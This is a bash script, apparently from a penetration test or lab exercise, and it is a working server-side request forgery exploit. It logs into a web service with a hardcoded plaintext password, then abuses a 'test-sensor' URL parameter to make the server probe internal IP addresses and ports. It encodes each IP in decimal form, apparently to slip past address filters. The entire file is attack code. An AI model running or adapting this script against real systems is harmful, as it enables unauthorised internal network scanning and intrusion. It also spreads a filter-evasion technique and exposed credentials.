#!/bin/bash
export PATH=$PATH:/usr/bin:/bin
BASE="http://169.58.126.107:6002"
ip="$1"; shift
dec=$(python3 -c "
parts=[int(x) for x in '$ip'.split('.')]
print(parts[0]*256**3+parts[1]*256**2+parts[2]*256+parts[3])
")
for port in "$@"; do
  jar=$(mktemp)
  curl -s -i -m 10 -c "$jar" -X POST "$BASE/login" -d "username=operator&password=St33lW0rks!2024" -o /dev/null
  res=$(curl -s -m 6 -b "$jar" -X POST "$BASE/ops/test-sensor" --data-urlencode "url=http://$dec:$port/")
  echo "$ip:$port -> $res"
  rm -f "$jar"
done
